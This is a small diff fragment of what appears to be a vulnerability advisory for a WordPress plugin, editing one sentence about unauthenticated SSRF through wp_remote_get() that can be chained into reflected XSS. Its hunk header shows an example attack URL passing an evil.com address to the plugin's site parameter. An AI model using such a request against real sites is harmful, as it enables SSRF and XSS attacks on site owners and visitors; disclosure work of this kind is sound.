@@ -32,7 +32,7 @@ http://victim.com/?print-my-blog=1&site=http://evil.com/
 
 # Details
 
-The wp_remote_get()[2] function gets called with an attacker
+The wp_remote_get()[2] function is called with an attacker
 controllable URL, resulting in unauthenticated SSRF. By setting
 up a malicious web server, the SSRF can be further chained to
 launch a reflected XSS attack. I'll leave it up to the reader
